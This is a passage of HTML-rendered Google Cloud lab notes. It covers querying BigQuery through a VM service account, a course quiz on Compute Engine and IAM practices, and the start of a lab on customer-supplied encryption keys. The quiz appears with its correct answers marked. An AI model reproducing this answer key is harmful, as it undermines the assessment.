class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat query.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Example output</span></strong><span> (yours will differ):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from google.auth import compute_engine</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from google.cloud import bigquery</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">credentials = compute_engine.Credentials(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  service_account_email='YOUR_SERVICE_ACCOUNT')</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">query = '''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  COUNT(1) as num_babies</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  publicdata.samples.natality</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year &gt; 2000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GROUP BY</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">client = bigquery.Client(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  project='qwiklabs-gcp-186de687ef87f911',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  credentials=credentials)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print(client.query(query).to_dataframe())</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 495px;"></div><div class="CodeMirror-gutters" style="display: none; height: 495px;"></div></div></div></pre><ol start='' ><li><p><span>Add the service account email to </span><code>query.py</code><span> with:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sed -i -e "s/YOUR_SERVICE_ACCOUNT/bigquery-qwiklab@$(gcloud config get-value project).iam.gserviceaccount.com/g" query.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following to make sure that the </span><code>sed</code><span> command has successfully changed the service account email in the file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat query.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Example output</span></strong><span> (yours will differ):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from google.auth import compute_engine</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from google.cloud import bigquery</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">credentials = compute_engine.Credentials(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  service_account_email='bigquery-qwiklab@qwiklabs-gcp-186de687ef87f911.iam.gserviceaccount.com')</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">query = '''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  COUNT(1) as num_babies</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  publicdata.samples.natality</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year &gt; 2000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GROUP BY</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  year</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">client = bigquery.Client(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  project='qwiklabs-gcp-186de687ef87f911',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  credentials=credentials)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print(client.query(query).to_dataframe())</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 473px;"></div><div class="CodeMirror-gutters" style="display: none; height: 473px;"></div></div></div></pre><p><span>The application will now use the permissions that are associated with this service account.</span></p><ol start='' ><li><p><span>Install the </span><code>pyarrow</code><span> library using this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo pip3 install pyarrow==16.1.0</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Install the </span><code>db-dtypes</code><span> library using this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo pip3 install db-dtypes</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the </span><code>query.py</code><span> using this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 query.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should be returned with a similar output as the following.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; year  num_babies</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">0  2008 &nbsp; &nbsp; 4255156</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1  2002 &nbsp; &nbsp; 4027376</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2  2005 &nbsp; &nbsp; 4145619</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3  2006 &nbsp; &nbsp; 4273225</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4  2001 &nbsp; &nbsp; 4031531</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5  2007 &nbsp; &nbsp; 4324008</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6  2003 &nbsp; &nbsp; 4096092</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7  2004 &nbsp; &nbsp; 4118907</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Your row values might not map to the years in the above output. However, make sure that the babies per year are the same.</span></p><p><span>You made a request to a BigQuery public dataset with a </span><code>bigquery-qwiklab</code><span> service account.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Use the Client Libraries to access BigQuery from a service account</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='congratulations-11'><span>Congratulations!</span></h4><p><span>In this lab, you have learned how to do the following:</span></p><ul><li><p><span>Create and manage service accounts.</span></p></li><li><p><span>Create a virtual machine and associate it with a service account.</span></p></li><li><p><span>Use client libraries to access BigQuery from a service account.</span></p></li><li><p><span>Run a query on a BigQuery public dataset from a Compute Engine instance.</span></p></li></ul><p>&nbsp;</p><h3 id='quiz-19'><span>Quiz</span></h3><ol start='' ><li><p><span>Which TWO recommendations below ARE considered to be Compute Engine &quot;best practices?&quot;</span></p></li></ol><ul><li><p><strong><span>Cloud Interconnect or Cloud VPN can be used to securely extend your data center network into Google Cloud projects.</span></strong></p><p><span>Correct! Using these services to extend your on-prem resources into the cloud helps to make your hybrid network more secure and reliable.</span></p></li><li><p><span>Always run critical VMs with default, scope-based service accounts.</span></p></li><li><p><span>Hardened custom images, once added to your Organization&#39;s resources, are then maintained by Google with automatic security patches and other updates.</span></p></li><li><p><strong><span>Utilize projects and IAM roles to control access to your VMs.</span></strong>
<span>Correct! Projects form the basis for creating, enabling, and using all Google Cloud services including managing permissions for Google Cloud resources.</span></p></li></ul><ol start='2' ><li><p><span>Which TWO of the following statements is TRUE when discussing the Organization Policy Service?</span></p></li></ol><ul><li><p><span>Descendants of a targeted resource do not inherit the parent&#39;s Organization Policy.</span></p></li><li><p><strong><span>Organization Policy Services allow centralized control for how your organization’s resources can be used.</span></strong></p><p><span>Correct! Organization Policy Service gives you both centralized and programmatic control over your organization&#39;s cloud resources.</span></p></li><li><p><strong><span>To define an Organization Policy, you will choose and then define a constraint against either a Google Cloud service or a group of Google Cloud services.</span></strong>
<span>Correct! Organization Policy Service allows you to set constraints that apply to all resources in your organization&#39;s hierarchy.</span></p></li></ul><ol start='3' ><li><p><span>Which of the following TWO statements about Google Cloud service accounts are TRUE?</span></p></li></ol><ul><li><p><strong><span>Virtual Machine (VM) instances use service accounts to run API requests on your behalf.</span></strong></p><p><span>Correct! When launching a virtual machine in Compute Engine, a service account can be associated directly to that VM.</span></p></li><li><p><span>VMs without service accounts cannot run APIs.</span></p></li><li><p><span>Custom service accounts use &quot;scopes&quot; to control API access.</span></p></li><li><p><strong><span>Service accounts are a type of identity.</span></strong></p><p><span>Correct! VMs authenticate using the identity of a service account when making calls to the Google APIs.</span></p></li></ul><p>&nbsp;</p><h2 id='securing-cloud-data-techniques-and-best-practices'><span>Securing Cloud Data: Techniques and Best Practices</span></h2><h3 id='lab---using-customer-supplied-encryption-keys-with-cloud-storage'><span>LAB - Using Customer-Supplied Encryption Keys with Cloud Storage</span></h3><h4 id='overview-14'><span>Overview</span></h4><p><a href='https://cloud.google.com/storage'><span>Cloud Storage</span></a><span> always encrypts your data on the server side with a Google-managed encryption key, before it is written to disk, at no additional charge. As an alternative to a Google-managed server-side encryption key, you can choose to provide your own AES-256 key, encoded in standard Base64. This key is known as a customer-supplied encryption key.</span></p><p><span>In this lab, you will configure customer-supplied encryption keys (CSEK) for Cloud Storage. Files will then be uploaded into a storage bucket. You will then generate a new encryption key and rotate CSEK keys.</span></p><p><span>Cloud Storage does not permanently store your key on Google&#39;s servers or otherwise manage your key. Instead, you provide your key for each Cloud Storage operation, and your key is purged from Google&#39;s servers after the operation is complete. Cloud Storage stores only a cryptographic hash of the key so that future requests can be validated against the hash.</span></p><p><span>Your key cannot be recovered from this hash, and the hash cannot be used to decrypt your data.</span></p><h5 id='objectives-11'><span>Objectives</span></h5><p><span>In this lab, you wil learn how to perform the following tasks:</span></p><ul><li><p><span>Configure CSEK for Cloud Storage.</span></p></li><li><p><span>Utilize CSEK to encrypt files in Cloud Storage.</span></p></li><li><p><span>Delete local files from Cloud Storage and verify encryption.</span></p></li><li><p><span>Rotate your encryption keys without downloading and re-uploading data.</span></p></li></ul><h4 id='setup-and-requirements-11'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-configure-required-resources'><span>Task 1. Configure required resources</span></h4><p><span>In this task, you configure the required resources that will be used throughout the lab.</span></p><h5 id='create-an-iam-service-account'><span>Create an IAM service account</span></h5><p><strong><span>Note:</span></strong><span> In this lab, you will launch a VM in Compute Engine and perform most of the work on this VM. A service account will first be created to provide the VM with the required permissions to perform the lab.</span></p><ol start='' ><li><p><span>In the Google Cloud Console, select </span><strong><span>Navigation menu &gt; IAM &amp; admin &gt; Service accounts</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Service Account</span></strong><span>.</span></p></li><li><p><span>Specify the </span><strong><span>Service account name</span></strong><span> as </span><code>cseklab</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Create and Continue</span></strong><span>.</span></p></li><li><p><span>Specify the </span><strong><span>Role</span></strong><span> as </span><strong><span>Cloud Storage &gt; Storage Admin</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><h5 id='create-a-compute-engine-vm'><span>Create a Compute Engine VM</span></h5><ol start='' ><li><p><span>In the Cloud Console, go to </span><strong><span>Navigation menu &gt; Compute Engine &gt; VM instances</span></strong><span>. Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults.</span></p></li></ol><ul><li><p><strong><span>Name:</span></strong><span> </span><code>cseklab-vm</code></p></li><li><p><strong><span>Region:</span></strong><span> </span><code>us-central1</code></p></li><li><p><strong><span>Zone:</span></strong><span> </span><code>us-central1-a</code></p></li><li><p><strong><span>Series:</span></strong><span> </span><code>E2</code></p></li><li><p><strong><span>Machine type:</span></strong><span> </span><code>e2-micro</code></p></li></ul><ol start='' ><li><p><span>Click </span><strong><span>Security</span></strong><span>, and then specify the following:</span></p></li></ol><ul><li><p><strong><span>Service account:</span></strong><span> The </span><strong><span>cseklab</span></strong><span> service account just created</span></p></li><li><p><strong><span>Access scopes:</span></strong><span> Select </span><strong><span>Set access for each API</span></strong><span>, for </span><strong><span>Storage</span></strong><span> select </span><strong><span>Full</span></strong><span> from the dropdown.</span></p></li></ul><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Once the VM launches, click the </span><strong><span>SSH</span></strong><span> button to connect to the VM.</span></p></li></ol><h5 id='create-a-cloud-storage-bucket'><span>Create a Cloud Storage bucket</span></h5><p><strong><span>Note:</span></strong><span> A bucket must have a globally unique name. For this lab you will use your Google Cloud project ID as part of the bucket name to help ensure it will be unique. Your Google Cloud project ID can be copied from the </span><strong><span>Connection Details</span></strong><span> pane in Qwiklabs.</span></p><ol start='' ><li><p><span>From the </span><strong><span>SSH</span></strong><span> terminal connected to the </span><strong><span>cseklab-vm</span></strong><span>, run the following command to create an environment variable to store the name of your bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 